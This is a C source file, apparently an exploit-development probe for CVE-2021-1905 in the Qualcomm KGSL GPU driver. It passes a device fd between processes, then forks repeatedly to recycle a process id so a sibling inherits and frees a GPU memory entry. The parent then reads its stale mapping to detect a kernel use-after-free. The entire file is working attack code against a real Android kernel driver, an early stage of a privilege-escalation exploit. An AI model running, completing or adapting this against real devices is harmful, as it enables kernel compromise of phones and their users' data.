/* CVE-2021-1905 endgame probe — Surface 2: shared-private mem-entry lifetime.
 *
 * A opens /dev/kgsl-3d0, GPUMEM_ALLOC_ID(id=1,gpuaddr=X), sends its fd to the
 * parent (private_A survives), exits. Parent holds fd_A AND a live mmap of the
 * entry at X. A recycled-tgid process C inherits private_A and frees entry id=1
 * (GPUMEM_FREE_ID) then re-allocs; the parent then reads its mmap and re-GET_INFO
 * to detect freed-page reuse / a UAF.
 *
 * Exploratory; read-only observations. Build: zig cc ... (see siblings).
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/wait.h>

#define KGSL_IOC_TYPE 0x09
struct kgsl_gpumem_alloc_id { unsigned int id, flags; size_t size, mmapsize; unsigned long gpuaddr; unsigned long __pad[2]; };
struct kgsl_gpumem_get_info { unsigned long gpuaddr; unsigned int id, flags; size_t size, mmapsize; unsigned long useraddr; unsigned long __pad[4]; };
struct kgsl_gpumem_free_id { unsigned int id, __pad; };
#define IOCTL_PMEM_ALLOC_ID _IOWR(KGSL_IOC_TYPE,0x34,struct kgsl_gpumem_alloc_id)
#define IOCTL_PMEM_FREE_ID  _IOWR(KGSL_IOC_TYPE,0x35,struct kgsl_gpumem_free_id)
#define IOCTL_PMEM_GET_INFO _IOWR(KGSL_IOC_TYPE,0x36,struct kgsl_gpumem_get_info)
#define DEV "/dev/kgsl-3d0"

static int send_fd(int sock,int fd){
    char b[1]={'x'}; struct iovec iov={b,1}; char cb[CMSG_SPACE(sizeof(int))]; memset(cb,0,sizeof cb);
    struct msghdr m; memset(&m,0,sizeof m); m.msg_iov=&iov; m.msg_iovlen=1; m.msg_control=cb; m.msg_controllen=sizeof cb;
    struct cmsghdr*c=CMSG_FIRSTHDR(&m); c->cmsg_level=SOL_SOCKET; c->cmsg_type=SCM_RIGHTS; c->cmsg_len=CMSG_LEN(sizeof(int));
    memcpy(CMSG_DATA(c),&fd,sizeof fd); return sendmsg(sock,&m,0)<0?-1:0;
}
static int recv_fd(int sock){
    char b[1]; struct iovec iov={b,1}; char cb[CMSG_SPACE(sizeof(int))]; memset(cb,0,sizeof cb);
    struct msghdr m; memset(&m,0,sizeof m); m.msg_iov=&iov; m.msg_iovlen=1; m.msg_control=cb; m.msg_controllen=sizeof cb;
    if(recvmsg(sock,&m,0)<0) return -1;
    for(struct cmsghdr*c=CMSG_FIRSTHDR(&m);c;c=CMSG_NXTHDR(&m,c))
      if(c->cmsg_level==SOL_SOCKET&&c->cmsg_type==SCM_RIGHTS){int fd;memcpy(&fd,CMSG_DATA(c),sizeof fd);return fd;}
    return -1;
}

static unsigned long g_gpuaddr=0; static unsigned g_memid=0; static int g_fdA=-1;

int main(void){
    setvbuf(stdout,NULL,_IONBF,0);
    printf("== kgsl 1905 Surface-2 (shared-private mem lifetime) ==\n");
    int sp[2]; if(socketpair(AF_UNIX,SOCK_DGRAM,0,sp)){perror("sp");return 1;}
    pid_t A=fork();
    if(A==0){
        close(sp[0]);
        int fd=open(DEV,O_RDWR); if(fd<0){printf("A open: %s\n",strerror(errno));_exit(1);}
        struct kgsl_gpumem_alloc_id a; memset(&a,0,sizeof a); a.size=0x1000;
        if(ioctl(fd,IOCTL_PMEM_ALLOC_ID,&a)<0){printf("A alloc: %s\n",strerror(errno));_exit(1);}
        char info[64]; int k=snprintf(info,sizeof info,"%lu %u",a.gpuaddr,a.id);
        send_fd(sp[1],fd); write(sp[1],info,k);
        printf("A: pid=%d id=%u gpuaddr=0x%lx size=%zu mmapsize=%zu\n",(int)getpid(),a.id,a.gpuaddr,a.size,a.mmapsize);
        _exit(0);
    }
    close(sp[1]);
    g_fdA=recv_fd(sp[0]);
    char info[64]={0}; read(sp[0],info,sizeof info-1);
    sscanf(info,"%lu %u",&g_gpuaddr,&g_memid);
    if(g_fdA<0){printf("[-] no fd\n");return 1;}
    printf("[*] parent fd_A=%d target gpuaddr=0x%lx id=%u\n",g_fdA,g_gpuaddr,g_memid);

    /* parent mmap of the shared entry */
    void *p=mmap(NULL,0x1000,PROT_READ|PROT_WRITE,MAP_SHARED,g_fdA,(off_t)g_gpuaddr);
    int mmok = (p!=MAP_FAILED);
    printf("[*] mmap(fd_A,0x%lx) -> %s %s\n",g_gpuaddr, mmok?"OK":"FAIL", mmok?"":strerror(errno));
    if(mmok){ memset(p,0xAB,0x1000); volatile unsigned char *q=(volatile unsigned char*)p;
              printf("[*] wrote pattern; first bytes: %02x %02x %02x %02x\n",q[0],q[1],q[2],q[3]); }

    int reap; while(waitpid(-1,&reap,WNOHANG)>0){}
    printf("[*] recycling pid %d; sibling will FREE id=%u...\n",(int)A,g_memid);
    int hit=0; long forks=0, ffail=0;
    for(long i=0;i<200000 && !hit;i++){
        pid_t c=fork();
        if(c<0){ ffail++; if(ffail>2000) break; usleep(1000); continue; }
        if(c==0){
            int fd=open(DEV,O_RDWR);
            if(fd>=0){
                struct kgsl_gpumem_get_info gi; memset(&gi,0,sizeof gi); gi.gpuaddr=g_gpuaddr;
                int r=ioctl(fd,IOCTL_PMEM_GET_INFO,&gi);
                if(r>=0 && gi.id==g_memid){
                    char o[128]; int k=snprintf(o,sizeof o,"[+] pid=%d inherited; GET_INFO id=%u useraddr=0x%lx\n",(int)getpid(),gi.id,gi.useraddr); write(1,o,k);
                    struct kgsl_gpumem_free_id fi; memset(&fi,0,sizeof fi); fi.id=g_memid;
                    int fr=ioctl(fd,IOCTL_PMEM_FREE_ID,&fi);
                    k=snprintf(o,sizeof o,"[+]   FREE_ID(%u) -> %d (%s)\n",g_memid,fr, fr?strerror(errno):"ok"); write(1,o,k);
                    memset(&gi,0,sizeof gi); gi.gpuaddr=g_gpuaddr;
                    r=ioctl(fd,IOCTL_PMEM_GET_INFO,&gi);
                    k=snprintf(o,sizeof o,"[+]   GET_INFO after free -> %d id=%u\n",r,gi.id); write(1,o,k);
                    struct kgsl_gpumem_alloc_id na; memset(&na,0,sizeof na); na.size=0x1000;
                    r=ioctl(fd,IOCTL_PMEM_ALLOC_ID,&na);
                    k=snprintf(o,sizeof o,"[+]   ALLOC_ID -> %d id=%u gpuaddr=0x%lx\n",r,na.id,na.gpuaddr); write(1,o,k);
                    _exit(42);
                }
                close(fd);
            }
            _exit(0);
        }
        forks++;
        int st; while(waitpid(-1,&st,WNOHANG)>0){ if(WIFEXITED(st)&&WEXITSTATUS(st)==42) hit=1; }
        if((forks & 0x3fff)==0) printf("... %ld forks (target %d)\n",forks,(int)A);
    }
    while(waitpid(-1,&reap,0)>0){}
    printf("[*] hit=%d forks=%ld\n",hit,forks);

    /* parent observations */
    struct kgsl_gpumem_get_info gi; memset(&gi,0,sizeof gi); gi.gpuaddr=g_gpuaddr;
    int r=ioctl(g_fdA,IOCTL_PMEM_GET_INFO,&gi);
    printf("[*] parent GET_INFO after sibling free -> %d id=%u size=%zu useraddr=0x%lx\n",r,gi.id,gi.size,gi.useraddr);
    if(mmok){
        volatile unsigned char *q=(volatile unsigned char*)p;
        printf("[*] parent mmap readback: %02x %02x %02x %02x (was AB AB AB AB)\n",q[0],q[1],q[2],q[3]);
    }
    printf("== done ==\n");
    return 0;
}
